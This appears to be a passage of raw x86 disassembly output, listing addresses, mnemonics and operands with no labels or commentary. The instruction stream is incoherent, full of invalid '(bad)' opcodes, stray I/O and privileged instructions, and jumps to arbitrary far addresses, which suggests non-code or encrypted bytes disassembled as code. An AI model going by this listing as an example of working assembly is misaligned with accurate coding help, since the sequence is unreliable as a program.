  404135:	jge    0x404178
  404137:	pusha  
  404138:	and    dh,BYTE PTR [edx]
  40413a:	inc    ecx
  40413b:	add    dl,al
  40413d:	or     DWORD PTR [ecx],ebx
  40413f:	shr    eax,0x9b
  404142:	xchg   BYTE PTR [edi-0x6e],bl
  404145:	fiadd  DWORD PTR [ebx]
  404147:	mov    dl,0xda
  404149:	xchg   DWORD PTR [edi],eax
  40414b:	hlt    
  40414c:	ins    DWORD PTR es:[edi],dx
  40414d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40414e:	add    BYTE PTR [eax+0x17],ch
  404151:	out    dx,al
  404152:	(bad)  
  404153:	(bad)  
  404155:	mov    esp,0x42a95512
  40415a:	pop    ebx
  40415b:	and    BYTE PTR [ecx+0x14],al
  40415e:	repz call 0x7ff2af67
  404164:	push   0xb0b1b1ce
  404169:	cmp    BYTE PTR [edx],0xc2
  40416c:	loope  0x4041d4
  40416e:	cli    
  40416f:	je     0x404154
  404171:	repnz mov edx,0x86ce57d4
  404177:	inc    ebp
  404178:	jp     0x404199
  40417a:	scas   eax,DWORD PTR es:[edi]
  40417b:	sbb    DWORD PTR [ecx],eax
  40417d:	call   DWORD PTR [ecx]
  40417f:	popf   
  404180:	mov    cs,WORD PTR [edi]
  404182:	mov    bh,0xcc
  404184:	or     DWORD PTR [ebx+0x28b75aed],ebp
  40418a:	xchg   DWORD PTR [edx-0x3a1c5159],ecx
  404190:	xchg   edx,eax
  404191:	dec    esi
  404192:	aas    
  404193:	repnz test BYTE PTR [ecx-0x3ac093e2],dl
  40419a:	out    dx,eax
  40419b:	cdq    
  40419c:	sub    DWORD PTR [edi-0x6aad7cfb],edx
  4041a2:	adc    eax,DWORD PTR [edi]
  4041a4:	mov    edx,0xa561f2b
  4041a9:	cmp    al,0x1c
  4041ab:	gs clc 
  4041ad:	popfw  
  4041af:	out    dx,al
  4041b0:	mov    al,0x4d
  4041b2:	push   DWORD PTR [edx+esi*8]
  4041b5:	cmp    DWORD PTR ds:0xe8909b5,ecx
  4041bb:	push   edx
  4041bc:	add    ebp,ebx
  4041be:	popf   
  4041bf:	push   eax
  4041c0:	lds    ebx,FWORD PTR ds:0xc0832465
  4041c6:	push   ebp
  4041c7:	mov    dl,bh
  4041c9:	aam    0xa4
  4041cb:	inc    edx
  4041cc:	loope  0x4041f7
  4041ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041cf:	push   edi
  4041d0:	cmp    BYTE PTR [ecx-0x3],0x99
  4041d4:	xlat   BYTE PTR ds:[ebx]
  4041d5:	push   eax
  4041d6:	mov    ebx,0xa0d7b668
  4041db:	or     BYTE PTR ds:0x369af1e,0xad
  4041e2:	mov    bh,0x1f
  4041e4:	push   edx
  4041e5:	into   
  4041e6:	pop    esp
  4041e7:	cmp    al,0x6d
  4041e9:	cmp    cl,BYTE PTR [ecx+0x63]
  4041ec:	mov    dh,0xa3
  4041ee:	(bad)  
  4041ef:	jl     0x404218
  4041f1:	push   edi
  4041f2:	sahf   
  4041f3:	(bad)  
  4041f4:	popa   
  4041f5:	jmp    0x7cb0:0xd35952da
  4041fc:	test   eax,0xceec37e
  404201:	in     al,dx
  404202:	test   BYTE PTR [ebp-0x66],bh
  404205:	loopne 0x4041eb
  404207:	jbe    0x404263
  404209:	stos   BYTE PTR es:[edi],al
  40420a:	ins    DWORD PTR es:[edi],dx
  40420b:	(bad)
  40420e:	jecxz  0x4041eb
  404210:	xor    ah,ch
  404212:	popf   
  404213:	mov    dl,0xf1
  404215:	pop    ebx
  404216:	xor    edi,edx
  404218:	cmc    
  404219:	rcpps  xmm6,XMMWORD PTR [ecx-0x622d4b39]
  404220:	adc    DWORD PTR [edi],edi
  404222:	int3   
  404223:	ja     0x40429f
  404225:	xor    eax,0xd032e2e9
  40422a:	ja     0x4041c6
  40422c:	icebp  
  40422d:	and    eax,DWORD PTR [ebx+0x5db310c2]
  404233:	sbb    esp,esp
  404235:	mov    ecx,0x47930159
  40423a:	ja     0x4042ac
  40423c:	pop    ecx
  40423d:	sar    DWORD PTR [edi],1
  40423f:	and    al,0xa0
  404241:	shl    BYTE PTR [ecx],0xdb
  404244:	pop    es
  404245:	cwde   
  404246:	out    dx,al
  404247:	lds    edx,FWORD PTR [eax+0x7a]
  40424a:	cmp    eax,0xb0331144
  40424f:	in     al,0x8c
  404251:	neg    BYTE PTR [ebx+edx*8+0x1370a37c]
  404258:	inc    esp
  404259:	add    DWORD PTR [edx-0x2b],0xe56676f2
  404260:	fcmovnbe st,st(6)
  404262:	pop    ss
  404263:	shl    BYTE PTR [ebx+0x61a2afbd],1
  404269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40426a:	inc    ecx
  40426b:	fiadd  WORD PTR [ebp-0x3b570363]
  404271:	mov    bl,0x8b
  404273:	mov    fs,WORD PTR [ebx-0x796af8b0]
  404279:	mov    ebp,0x580dbdc4
  40427e:	(bad)  
  40427f:	mov    ds:0x8ad50c0,eax
  404284:	arpl   WORD PTR [edi],si
  404286:	add    DWORD PTR [ebx-0x60],ebp
  404289:	sbb    edx,DWORD PTR [eax]
  40428b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428c:	inc    bx
  40428e:	inc    esp
  40428f:	sub    DWORD PTR [edx+ecx*4+0x15f251b9],0x6
  404297:	js     0x404261
  404299:	outs   dx,DWORD PTR ds:[esi]
  40429a:	adc    al,BYTE PTR ds:0xef3bf36c
  4042a0:	push   es
  4042a1:	cs push esi
  4042a3:	push   es
  4042a4:	jno    0x404294
  4042a6:	xchg   ebp,eax
  4042a7:	hlt    
  4042a8:	jne    0x4042a5
  4042aa:	call   0x50a658dd
  4042af:	mov    esi,0xe45a671d
  4042b4:	mov    eax,0x6af0f065
  4042b9:	jecxz  0x404256
  4042bb:	enter  0x8c1b,0x9c
  4042bf:	mov    cl,0xa4
  4042c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c2:	les    eax,FWORD PTR [edi-0x76d2067]
  4042c8:	mov    edx,0x1e5a479e
  4042cd:	adc    DWORD PTR [esi+0x62],esi
  4042d0:	sub    eax,0x929b51e7
  4042d5:	pushf  
  4042d6:	ret    0x80c6
  4042d9:	out    0x63,eax
  4042db:	int    0xee
  4042dd:	add    BYTE PTR [edi-0x4d7c9edc],al
  4042e3:	adc    edx,esp
  4042e5:	repnz mov DWORD PTR [edx-0x5aa53a44],esp
  4042ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042ed:	mov    bl,0xe7
  4042ef:	mov    al,ds:0x919f9f75
  4042f4:	sbb    cl,BYTE PTR [esi]
  4042f6:	outs   dx,BYTE PTR ds:[esi]
  4042f7:	mov    bl,0x44
  4042f9:	or     DWORD PTR [edx-0x16135b24],0xffffffb5
  404300:	inc    esp
  404301:	ffreep st(2)
  404303:	lock adc DWORD PTR [edi+0x34],eax
  404307:	fsub   QWORD PTR [edi]
  404309:	fild   DWORD PTR [edx]
  40430b:	pop    esi
  40430c:	jmp    0x6678:0x96c1b7a0
  404313:	sahf   
  404314:	jecxz  0x4042ea
  404316:	(bad)  
  404317:	xor    al,0x36
  404319:	inc    edx
  40431a:	push   ecx
  40431b:	and    eax,0xdfcf11a8
  404320:	adc    BYTE PTR [eax+0x6a],ch
  404323:	mul    DWORD PTR [ecx+edi*2]
  404326:	fcom   QWORD PTR [edi+0x33267ca6]
  40432c:	cwde   
  40432d:	xor    dh,dh
  40432f:	add    ch,BYTE PTR [esi-0x4d641513]
  404335:	mov    ch,0xb6
  404337:	xchg   dl,cl
  404339:	or     al,0xb
  40433b:	jno    0x40437d
  40433d:	call   0x3b9:0xd685b37d
  404344:	xor    BYTE PTR [esi+0x56],ch
  404347:	clc    
  404348:	test   eax,0xfc47e30e
  40434d:	in     eax,dx
  40434e:	mov    ch,0xd0
  404350:	lods   al,BYTE PTR ds:[esi]
  404351:	scas   al,BYTE PTR es:[edi]
  404352:	ds aam 0x14
  404355:	jg     0x40434a
  404357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404358:	dec    edx
  404359:	daa    
  40435a:	adc    ebx,edi
  40435c:	mov    ecx,0xd9400ffe
  404361:	cld    
  404362:	xor    eax,0xcb8fc09d
  404367:	ja     0x4042ef
  404369:	ss lahf 
  40436b:	les    eax,FWORD PTR [esi-0x7e839567]
  404371:	jo     0x4043aa
  404373:	ins    BYTE PTR es:[edi],dx
  404374:	dec    esp
  404375:	xor    eax,0x7d69ea3
  40437a:	cmp    DWORD PTR [eax-0x2b],esi
  40437d:	repnz (bad) 
  40437f:	(bad)  
  404380:	in     al,dx
  404381:	inc    eax
  404382:	jnp    0x40430b
  404384:	lods   al,BYTE PTR es:[esi]
  404386:	xchg   esp,eax
  404387:	mov    edx,edx
  404389:	mov    ebp,0xd18e54f
  40438e:	enter  0x9e70,0x53
  404392:	add    ebx,DWORD PTR [eax]
  404394:	jmp    0x3383c000
  404399:	std    
  40439a:	(bad)  
  40439b:	test   al,0x56
  40439d:	daa    
  40439e:	or     DWORD PTR [eax+0xe1cf854],ebx
  4043a4:	xor    ebp,DWORD PTR [ebx+0x38]
  4043a7:	into   
  4043a8:	rcl    DWORD PTR [edi],0x62
  4043ab:	pop    esp
  4043ac:	hlt    
  4043ad:	iret   
  4043ae:	add    BYTE PTR [edi],bh
  4043b0:	out    0xe0,al
  4043b2:	push   esp
  4043b3:	push   esp
  4043b4:	into   
  4043b5:	adc    dh,BYTE PTR [edi]
  4043b7:	sbb    ecx,DWORD PTR [edi-0x799e647f]
  4043bd:	pushf  
  4043be:	mov    ebx,0x4f9e2810
  4043c3:	xor    eax,0x47cccac3
  4043c8:	inc    ecx
  4043c9:	jmp    0xe5d3:0x78e69c67
  4043d0:	pop    eax
  4043d1:	int3   
  4043d2:	mov    edi,0x2eaa959f
  4043d7:	mov    bh,0x50
  4043d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043da:	fcmovne st,st(7)
  4043dc:	sbb    di,WORD PTR fs:[eax]
  4043e0:	(bad)  
  4043e1:	cmp    eax,0x6948fe6d
  4043e6:	les    esi,FWORD PTR [esi+0x3e792e8]
  4043ec:	rcl    ebx,0x80
  4043ef:	sub    ch,BYTE PTR [edx]
  4043f1:	mov    ds:0x26ec93cd,al
  4043f6:	dec    ebx
  4043f7:	gs pop esi
  4043f9:	dec    esp
  4043fa:	outs   dx,DWORD PTR ds:[esi]
  4043fb:	jl     0x404455
  4043fd:	xchg   esp,eax
  4043fe:	nop
  4043ff:	fidiv  WORD PTR [ebx]
  404401:	mov    BYTE PTR [esi],dl
  404403:	or     eax,0x41f00255
  404408:	shr    DWORD PTR [edi+0x40fb40d8],cl
  40440e:	adc    al,0xa9
  404410:	and    dh,ah
  404412:	das    
  404413:	in     al,dx
  404414:	or     eax,0xf7ecf448
  404419:	pop    edi
  40441a:	sbb    ch,cl
  40441c:	mov    DWORD PTR ss:[ecx+0x46],edx
  404420:	jo     0x4043c1
  404422:	jne    0x4043ff
  404424:	mov    al,ds:0xb7f86cbe
  404429:	das    
  40442a:	add    ch,dh
  40442c:	mov    al,0x4d
  40442e:	xchg   BYTE PTR [esi+ebp*8+0x7bda55af],ch
  404435:	test   BYTE PTR [ebp-0x6d5d883c],al
  40443b:	mov    eax,0xa1697807
  404440:	and    al,dh
  404442:	pop    esi
  404443:	cmp    al,al
  404445:	xchg   edi,eax
  404446:	pop    es
  404447:	scas   al,BYTE PTR es:[edi]
  404448:	xchg   DWORD PTR [ecx-0x2200f7bf],esp
  40444e:	add    esp,DWORD PTR [edx-0x8a5ec0]
  404454:	mov    esp,0x835da6c4
  404459:	push   ebp
  40445a:	push   cs
  40445b:	mov    bl,0xb3
  40445d:	fwait
  40445e:	(bad)  
  40445f:	xor    dh,BYTE PTR [esi-0x57]
  404462:	setge  BYTE PTR [edi+ebp*8-0x160bda7f]
  40446a:	add    edi,ebp
  40446c:	push   ds
  40446d:	or     ecx,DWORD PTR [edi-0x50e03a69]
  404473:	cmp    al,0x2f
  404475:	in     al,dx
  404476:	dec    edx
  404477:	mov    cl,0xe1
  404479:	jmp    0xc7e1b78f
  40447e:	mov    ch,BYTE PTR [edi]
  404480:	sub    cl,BYTE PTR [eax-0x3924c831]
  404486:	out    dx,eax
  404487:	lock or eax,0xc97176a6
  40448d:	neg    DWORD PTR [ecx+0x5e25799e]
  404493:	(bad)  
  404494:	sbb    ch,BYTE PTR [edx+0x25]
  404497:	push   esp
  404498:	mov    edi,0xae4af8e9
  40449d:	cmp    eax,0xd755355d
  4044a2:	mov    edx,0xd2a980c2
  4044a7:	sbb    dh,BYTE PTR [ebp+0x12]
  4044aa:	xor    BYTE PTR [edi-0x62],0x8a
  4044ae:	enter  0xbcc0,0xf7
  4044b2:	fnstenv [edx+edx*4+0x5c]
  4044b6:	jae    0x4044c6
  4044b8:	and    esp,DWORD PTR [esi-0x4012f2c6]
  4044be:	cwde   
  4044bf:	or     al,0x7d
  4044c1:	adc    al,0x14
  4044c3:	inc    eax
  4044c4:	adc    BYTE PTR [esi-0x18],0xe6
  4044c8:	cmp    DWORD PTR [ecx-0x68],esi
  4044cb:	pop    esp
  4044cc:	mov    eax,ds:0x6ae3b250
  4044d1:	faddp  st(3),st
  4044d3:	aam    0x54
  4044d5:	jno    0x404553
  4044d7:	sahf   
  4044d8:	mov    ebx,0xc146dc24
  4044dd:	mov    ds:0x1f33fc33,al
  4044e2:	aas    
  4044e3:	xchg   esp,eax
  4044e4:	adc    BYTE PTR [eax],bl
  4044e6:	pop    ds
  4044e7:	cmp    DWORD PTR [ebp+0x16feffef],0xa2bb7113
  4044f1:	sub    ebp,0xb56547fa
  4044f7:	daa    
  4044f8:	in     eax,0x4
  4044fa:	leave  
  4044fb:	mov    al,ds:0xc8a4be43
  404500:	pusha  
  404501:	dec    esi
  404502:	pop    esp
  404503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404504:	mov    ebx,0xeb297661
  404509:	popf   
  40450a:	cld    
  40450b:	xchg   ebx,eax
  40450c:	sub    eax,esp
  40450e:	scas   eax,DWORD PTR es:[edi]
  40450f:	rol    dh,1
  404511:	jp     0x404511
  404513:	das    
  404514:	jge    0x404520
  404516:	mov    edx,0x4d5fc881
  40451b:	rcr    al,0xca
  40451e:	sub    ecx,ebp
  404520:	push   0x42
  404522:	pop    esp
  404523:	(bad)  
  404524:	mov    ah,0xd0
  404526:	xchg   esi,eax
  404527:	(bad)  
  404528:	fldenv [edx+0x1a]
  40452b:	pop    ebp
  40452c:	or     ecx,esp
  40452e:	mov    fs,esp
  404530:	sahf   
  404531:	js     0x404536
  404533:	cli    
  404534:	pop    edi
  404535:	mov    edx,0xa383b70c
  40453a:	sbb    al,0x84
  40453c:	sub    al,0x4
  40453e:	scas   al,BYTE PTR es:[edi]
  40453f:	mov    ebx,0x5f0e4195
  404544:	maskmovq mm3,(bad)
  404545:	neg    DWORD PTR [ebx+0xb2fb1cc]
  40454b:	add    DWORD PTR ds:0x180208ea,ebx
  404551:	xchg   BYTE PTR [esi-0x712f6481],dh
  404557:	(bad)  
  404558:	sub    ebp,DWORD PTR [edi]
  40455a:	adc    BYTE PTR [ecx-0x668cc08],ah
  404560:	dec    ebx
  404561:	les    esi,FWORD PTR [ebx+0x681bf7dc]
  404567:	das    
  404568:	test   DWORD PTR [ebx+0x79],0x57c717f3
  40456f:	sub    esp,ebx
  404571:	loop   0x404558
  404573:	mov    esi,0x828a7483
  404578:	test   al,0xb0
  40457a:	xor    dh,al
  40457c:	sub    DWORD PTR [edi+0x50],esi
  40457f:	mov    eax,0x23b88d3e
  404584:	ror    BYTE PTR [eax-0x7ccbe5ce],cl
  40458a:	(bad)  
  40458b:	loope  0x4045f9
  40458d:	cs push edi
  40458f:	retf   
  404590:	cmp    DWORD PTR [ebp-0x1e83c50a],esi
  404596:	pop    ebp
  404597:	mov    ebp,DWORD PTR [edx-0x9]
  40459a:	idiv   esi
  40459c:	retf   
  40459d:	daa    
  40459e:	into   
  40459f:	shl    BYTE PTR [ebp+0x312324a8],1
  4045a5:	pop    es
  4045a6:	mov    ss,WORD PTR [edi]
  4045a8:	inc    edx
  4045a9:	cmp    ebp,ecx
  4045ab:	pop    ebx
  4045ac:	ret    
  4045ad:	and    al,0xb1
  4045af:	lahf   
  4045b0:	sub    al,0x1
  4045b2:	(bad)  [ecx]
  4045b4:	sbb    al,bh
  4045b6:	fsub   QWORD PTR [edx]
  4045b8:	shl    bl,1
  4045ba:	sbb    eax,0x3dc94e7
  4045bf:	test   BYTE PTR [edi+edx*4+0x6c1716f9],bl
  4045c6:	sub    BYTE PTR [ecx+0x10a2d8a1],dl
  4045cc:	or     ecx,0x211b769e
  4045d2:	je     0x404560
  4045d4:	hlt    
  4045d5:	mov    bl,0xfe
  4045d7:	xchg   edx,eax
  4045d8:	les    edi,FWORD PTR [ebp+eiz*2+0x28]
  4045dc:	lods   eax,DWORD PTR ds:[esi]
  4045dd:	push   edx
  4045de:	clc    
  4045df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e0:	inc    ebp
  4045e1:	add    al,0x44
  4045e3:	dec    esp
  4045e4:	sub    DWORD PTR [edi+0xb6bee8b],ebx
  4045ea:	fdivr  QWORD PTR [edi]
  4045ec:	shl    BYTE PTR [edi-0x66],cl
  4045ef:	jmp    DWORD PTR [edx]
  4045f1:	in     eax,0x5c
  4045f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f4:	cmp    esi,DWORD PTR [edx]
  4045f6:	mov    ecx,0x4c1eb9d8
  4045fb:	sub    al,0x12
  4045fd:	jmp    0x448d:0x4aacb67b
  404604:	mov    DWORD PTR ds:0x111fa309,edi
  40460a:	xchg   esi,eax
  40460b:	pop    ebp
  40460c:	add    edx,DWORD PTR [edx-0x2f]
  40460f:	adc    bl,BYTE PTR [ebx]
  404611:	sbb    al,0x99
  404613:	mov    eax,ds:0xe95c3583
  404618:	nop    DWORD PTR [ecx-0x76]
  40461c:	stc    
  40461d:	repz inc ecx
  40461f:	mov    esi,0xb60cf462
  404624:	xchg   ebp,eax
  404625:	push   edi
  404626:	pop    ebp
  404627:	mov    al,ds:0x1f1f9411
  40462c:	cdq    
  40462d:	scas   al,BYTE PTR es:[edi]
  40462e:	leave  
  40462f:	sub    eax,0x7fbc582a
  404634:	inc    esi
  404635:	retf   
  404636:	jl     0x4045e3
  404638:	mov    cl,0xf1
  40463a:	pop    eax
  40463b:	mov    esp,0xd053c077
  404640:	arpl   bp,si
  404642:	mov    WORD PTR [esi+0x27489b34],?
  404648:	sub    DWORD PTR [ebx],ebp
  40464a:	inc    edi
  40464b:	lods   al,BYTE PTR ds:[esi]
  40464c:	in     al,0xab
  40464e:	cmp    al,BYTE PTR [edx]
  404650:	cmp    esi,DWORD PTR [ebx+0x14]
  404653:	(bad)
  404656:	pop    ebx
  404657:	cmp    eax,0x40fb3464
  40465c:	lahf   
  40465d:	cs retf 
  40465f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404660:	xor    ch,BYTE PTR [esp+ecx*2-0x68]
  404664:	shl    BYTE PTR [ecx-0x1d395df9],cl
  40466a:	mov    al,0xa9
  40466c:	or     eax,0xcb155a1e
  404671:	push   esp
  404672:	xchg   ebx,eax
  404673:	gs arpl bp,sp
  404676:	xor    ebp,DWORD PTR [eax+0x7a]
  404679:	and    eax,0xc36027d1
  40467e:	or     esp,DWORD PTR [ebx+0x4a]
  404681:	xor    eax,0x66d17bc2
  404686:	shr    BYTE PTR [esi-0x120eae5a],1
  40468c:	xor    dl,BYTE PTR [ebx+0x28]
  40468f:	and    ch,cl
  404691:	mov    ebp,0xa65191f3
  404696:	arpl   WORD PTR [ebp+0xeb9ec2],di
  40469c:	lahf   
  40469d:	cld    
  40469e:	lock pushf 
  4046a0:	lods   al,BYTE PTR ds:[esi]
  4046a1:	sub    eax,0x13880995
  4046a6:	repnz ins DWORD PTR es:[edi],dx
  4046a8:	xchg   ebp,eax
  4046a9:	aam    0xaf
  4046ab:	icebp  
  4046ac:	pop    ds
  4046ad:	mov    dh,0xbe
  4046af:	das    
  4046b0:	xor    ah,al
  4046b2:	adc    al,al
  4046b4:	ret    0xe3d6
  4046b7:	jmp    0x35ed8e77
  4046bc:	push   cs
  4046bd:	push   0xffffff8c
  4046bf:	popa   
  4046c0:	push   0x2fe02083
  4046c5:	xor    al,BYTE PTR gs:[ecx+0x5595f2f4]
  4046cc:	imul   esp,DWORD PTR [ebx+0x3a1c4def],0x4e0da3a2
  4046d6:	cld    
  4046d7:	xchg   ebx,eax
  4046d8:	cmp    BYTE PTR [ebp-0x77],dh
  4046db:	fadd   DWORD PTR [ecx]
  4046dd:	(bad)  
  4046de:	outs   dx,BYTE PTR ds:[esi]
  4046df:	int3   
  4046e0:	stos   DWORD PTR es:[edi],eax
  4046e1:	pusha  
  4046e2:	inc    esp
  4046e3:	pop    ds
  4046e4:	loop   0x4046e7
  4046e6:	push   esi
  4046e7:	mov    bh,0x11
  4046e9:	pop    ebx
  4046ea:	cmp    dl,BYTE PTR [edi+ecx*2+0x35c72a1f]
  4046f1:	fidivr DWORD PTR [ebx+0x63b243db]
  4046f7:	loop   0x4046e8
  4046f9:	ins    BYTE PTR es:[edi],dx
  4046fa:	mov    al,0x1b
  4046fc:	mov    ds:0x1759b69c,eax
  404701:	mov    ebx,0x6cdd850b
  404706:	push   es
  404707:	sub    dl,al
  404709:	popa   
  40470a:	call   0x3d8:0x245d3f15
  404711:	jl     0x404712
  404713:	cmp    dh,bh
  404715:	std    
  404716:	inc    ebp
  404717:	je     0x4046ed
  404719:	inc    ebx
  40471a:	jmp    0xdba3:0x2924f7fb
  404721:	sti    
  404722:	es pop ebp
  404724:	repnz sar BYTE PTR [esi],cl
  404727:	sub    ecx,DWORD PTR [edi]
  404729:	loop   0x404760
  40472b:	repnz mov BYTE PTR [edx+esi*8+0x6e],ch
  404730:	jnp    0x40475d
  404732:	or     al,BYTE PTR ds:0xa1f1d801
  404738:	xchg   ebp,eax
  404739:	rcr    DWORD PTR [eax-0x109f4d71],1
  40473f:	test   eax,ebx
  404741:	xor    al,0xa9
  404743:	mov    edx,0xc572491f
  404748:	daa    
  404749:	pop    es
  40474a:	ret    
  40474b:	(bad)
  40474e:	lahf   
  40474f:	inc    ebp
  404750:	adc    ch,dl
  404752:	sbb    DWORD PTR [eax*4+0x5a362625],ebp
  404759:	jle    0x4046ed
  40475b:	sbb    al,0x39
  40475d:	cli    
  40475e:	test   BYTE PTR [ecx-0x59],0x38
  404762:	mov    ch,0x33
  404764:	jmp    0xf909:0x8b1d358f
  40476b:	stc    
  40476c:	push   es
  40476d:	push   esi
  40476e:	enter  0xc23e,0x18
  404772:	push   ecx
  404773:	in     al,dx
  404774:	cmp    ecx,esi
  404776:	shl    DWORD PTR [ecx-0x202a6500],0xe1
  40477d:	and    dh,BYTE PTR [esi-0xf7253fc]
  404783:	and    ecx,DWORD PTR [edx]
  404785:	cdq    
  404786:	lds    eax,FWORD PTR [ecx-0x7c]
  404789:	hlt    
  40478a:	popf   
  40478b:	mov    DWORD PTR [esi+0x2a],ebp
  40478e:	fdivr  DWORD PTR [esp+eiz*2+0x4e]
  404792:	mov    al,ds:0x8c49b46d
  404797:	sar    DWORD PTR [ebp+esi*1+0x2095348f],cl
  40479e:	outs   dx,BYTE PTR ds:[esi]
  40479f:	aaa    
  4047a0:	ins    DWORD PTR es:[edi],dx
  4047a1:	add    DWORD PTR [edx],eax
  4047a3:	cli    
  4047a4:	fneni(8087 only) 
  4047a6:	not    DWORD PTR [ebx]
  4047a8:	jp     0x404810
  4047aa:	aaa    
  4047ab:	push   ebx
  4047ac:	(bad)  
  4047ad:	adc    al,0xd8
  4047af:	cmp    DWORD PTR [eax],ebp
  4047b1:	cmp    ecx,ecx
  4047b3:	mov    dh,0xc6
  4047b5:	scas   eax,DWORD PTR es:[edi]
  4047b6:	pop    esi
  4047b7:	jecxz  0x404813
  4047b9:	cdq    
  4047ba:	shl    DWORD PTR [ebp+0x3a],cl
  4047bd:	mov    ebx,0x9eb8172c
  4047c2:	cmp    DWORD PTR [ebx-0x58],edx
  4047c5:	gs mov esp,ss
  4047c8:	or     eax,0xea8d5800
  4047cd:	push   cs
  4047ce:	push   ds
  4047cf:	loop   0x40480f
  4047d1:	push   eax
  4047d2:	or     BYTE PTR [ebx+0x3d],0x5f
  4047d6:	cdq    
  4047d7:	jg     0x404763
  4047d9:	cld    
  4047da:	cmp    BYTE PTR [eax+0x4cbb9abf],dl
  4047e0:	ror    BYTE PTR [esp+eiz*8-0x29],cl
  4047e4:	(bad)  
  4047e5:	je     0x40480b
  4047e7:	arpl   WORD PTR [ebx],ax
  4047e9:	xlat   BYTE PTR ds:[ebx]
  4047ea:	out    0x5,al
  4047ec:	jp     0x4047aa
  4047ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ef:	mov    ecx,0x8217c7d0
  4047f4:	jp     0x40478d
  4047f6:	xchg   BYTE PTR [esi-0x16],al
  4047f9:	lods   eax,DWORD PTR ds:[esi]
  4047fa:	std    
  4047fb:	pop    esi
  4047fc:	sar    BYTE PTR [eax+0x3d],0x23
  404800:	outs   dx,DWORD PTR ds:[esi]
  404801:	sbb    al,0xe5
  404803:	xor    eax,0xc8c42cdb
  404808:	dec    edi
  404809:	jecxz  0x404879
  40480b:	aaa    
  40480c:	repnz dec esp
  40480e:	test   ecx,0x9d0b76d1
  404814:	cdq    
  404815:	xor    DWORD PTR [esi-0x4e],ebx
  404818:	xchg   esi,eax
  404819:	pop    ebx
  40481a:	xchg   edx,eax
  40481b:	xchg   DWORD PTR [ebp+0x430277ee],ebx
  404821:	je     0x40485a
  404823:	or     ebx,DWORD PTR [edi-0x5a7d7a36]
  404829:	rcr    DWORD PTR [edi],cl
  40482b:	test   BYTE PTR [ebx+edx*4+0xa],dl
  40482f:	cmp    DWORD PTR [ebx],ecx
  404831:	or     al,BYTE PTR [edx-0x58]
  404834:	ret    
  404835:	push   0x5e2ee7aa
  40483a:	or     ebp,ecx
  40483c:	xlat   BYTE PTR ds:[ebx]
  40483d:	je     0x4048ad
  40483f:	enter  0x2123,0x37
  404843:	aad    0x31
  404845:	jmp    0x45cb191f
  40484a:	addr16 ret 0x3241
  40484e:	fsubr  QWORD PTR [ecx]
  404850:	into   
  404851:	mov    ecx,0x4f508371
  404856:	gs pushf 
  404858:	pop    ebx
  404859:	ins    DWORD PTR es:[edi],dx
  40485a:	loope  0x40486e
  40485c:	outs   dx,BYTE PTR ds:[esi]
  40485d:	(bad)  
  40485e:	and    bh,dl
  404860:	rol    BYTE PTR [esi+0x36],cl
  404863:	fidiv  WORD PTR [eax+edx*4+0x7986cb2b]
  40486a:	shr    DWORD PTR [esi],cl
  40486c:	push   es
  40486d:	jnp    0x4047fc
  40486f:	rcl    DWORD PTR [esi-0x34],1
  404872:	gs pop edx
  404874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404875:	fadd   st,st(5)
  404877:	mov    ah,0x6b
  404879:	(bad)  
  40487a:	fadd   st,st(4)
  40487c:	lock mov al,ds:0x5c24ead8
  404882:	bnd jne 0x404831
  404885:	push   ds
  404886:	pop    ebp
  404887:	adc    bh,BYTE PTR [ebx+0x1d]
  40488a:	mov    al,ds:0xc21bc808
  40488f:	inc    esp
  404890:	mov    dh,0x5b
  404892:	inc    edx
  404893:	jg     0x4048a1
  404895:	and    al,0x60
  404897:	call   0x483b23df
  40489c:	sbb    al,0x8e
  40489e:	mov    al,ds:0x8a5fa4
  4048a3:	or     BYTE PTR [esi-0x732240b8],ah
  4048a9:	push   ds
  4048aa:	mov    bh,0xdb
  4048ac:	ins    BYTE PTR es:[edi],dx
  4048ad:	mov    esi,0x9449bbe0
  4048b2:	add    DWORD PTR [edi],ecx
  4048b4:	dec    ebx
  4048b5:	in     eax,0x8d
  4048b7:	mov    BYTE PTR ds:0xd0ca4ed2,al
  4048bd:	cmp    ebp,DWORD PTR [edi+0x41]
  4048c0:	mov    esp,ecx
  4048c2:	ins    DWORD PTR es:[edi],dx
  4048c3:	inc    eax
  4048c4:	mov    ah,0x96
  4048c6:	push   ebp
  4048c7:	mov    al,0x62
  4048c9:	les    eax,FWORD PTR [eax+0x34540c61]
  4048cf:	(bad)  
  4048d0:	adc    ch,BYTE PTR [edx+0x59]
  4048d3:	jecxz  0x40487c
  4048d5:	dec    ecx
  4048d6:	inc    ecx
  4048d7:	mov    ebp,DWORD PTR [esi]
  4048d9:	lods   al,BYTE PTR ds:[esi]
  4048da:	or     esp,DWORD PTR [edi]
  4048dc:	xlat   BYTE PTR ds:[ebx]
  4048dd:	test   al,0x4a
  4048df:	pop    ecx
  4048e0:	fsub   DWORD PTR [edx-0x5f]
  4048e3:	inc    ecx
  4048e4:	aaa    
  4048e5:	xor    ebx,eax
  4048e7:	push   edi
  4048e8:	pop    ebx
  4048e9:	(bad)  
  4048ea:	sbb    bl,BYTE PTR [eax]
  4048ec:	jne    0x404937
  4048ee:	aam    0xd4
  4048f0:	in     al,dx
  4048f1:	jg     0x404873
  4048f3:	inc    ecx
  4048f4:	pop    ebx
  4048f5:	pop    ds
  4048f6:	cmp    DWORD PTR [esi+0x43ab4c4a],0x32154b76
  404900:	shl    DWORD PTR [ebx-0x10],0xf9
  404904:	pusha  
  404905:	scas   al,BYTE PTR es:[edi]
  404906:	mov    eax,0x2ddc170a
  40490b:	xor    dl,BYTE PTR [ebx-0x4d]
  40490e:	dec    ebx
  40490f:	pause  
  404911:	pop    ebp
  404912:	add    ch,BYTE PTR [ebx-0x15468681]
  404918:	int3   
